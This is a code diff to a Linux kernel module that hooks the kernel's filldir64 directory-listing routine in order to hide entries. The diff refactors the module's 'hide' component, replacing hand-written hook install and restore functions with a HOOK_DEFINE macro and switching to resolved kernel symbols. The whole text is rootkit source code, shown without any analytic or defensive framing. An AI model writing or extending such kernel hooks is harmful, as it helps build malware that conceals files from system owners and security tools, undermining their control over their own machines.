@@ -2,7 +2,6 @@
 #include <linux/kernel.h>
 #include <linux/string.h>
 #include <linux/dirent.h>
-#include <linux/slab.h>
 
 #include "license.h"
 #include "ksyms.h"
@@ -53,7 +52,7 @@ static int filldir64_hook(struct dir_context *ctx, const char *name, int namlen,
 
     /* original filldir64 code */
 
-    buf->error = verify_dirent_name(name, namlen);
+    buf->error = ksyms__verify_dirent_name(name, namlen);
     if (unlikely(buf->error))
         return buf->error;
     buf->error = -EINVAL;
@@ -86,36 +85,4 @@ efault:
     return -EFAULT;
 }
 
-static struct view filldir64_restore = {0};
-
-void hide_set_filldir64(void) {
-    struct view restore;
-
-    // only set if not previously set
-    if (filldir64_restore.ptr != NULL)
-        return;
-    
-    restore = hook_set((void *)filldir64, &filldir64_hook);
-
-    filldir64_restore.ptr = kmalloc(restore.size, GFP_KERNEL);
-    if (!filldir64_restore.ptr) {
-        /* well */
-    }
-
-    filldir64_restore.size = restore.size;
-
-    memcpy(filldir64_restore.ptr, restore.ptr, restore.size);
-}
-
-void hide_unset_filldir64(void) {
-    // only unset if previously set
-    if (filldir64_restore.ptr == NULL)
-        return;
-    
-    hook_unset((void *)filldir64, filldir64_restore);
-    kfree(filldir64_restore.ptr);
-    
-    // reset view so on next hook_set kmalloc will be called
-    filldir64_restore.ptr = 0;
-    filldir64_restore.size = 0;
-}
+HOOK_DEFINE(hide, filldir64, ksyms__filldir64, &filldir64_hook)
